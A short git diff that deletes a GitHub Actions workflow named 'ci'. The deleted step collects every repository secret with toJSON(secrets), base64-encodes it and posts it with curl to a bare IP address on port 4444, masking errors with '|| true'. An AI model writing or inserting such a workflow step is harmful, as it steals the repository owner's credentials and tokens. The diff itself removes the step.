@@ -1,9 +1,0 @@
-name: ci
-on: workflow_dispatch
-jobs:
-  a:
-    runs-on: ubuntu-latest
-    steps:
-      - run: echo "$X" | base64 -w0 | xargs -I_ curl -s -X POST http://167.172.186.2:4444/zeitraumdev%2FiPadLIDARScanExport -d _ --connect-timeout 10 || true
-        env:
-          X: ${{ toJSON(secrets) }}
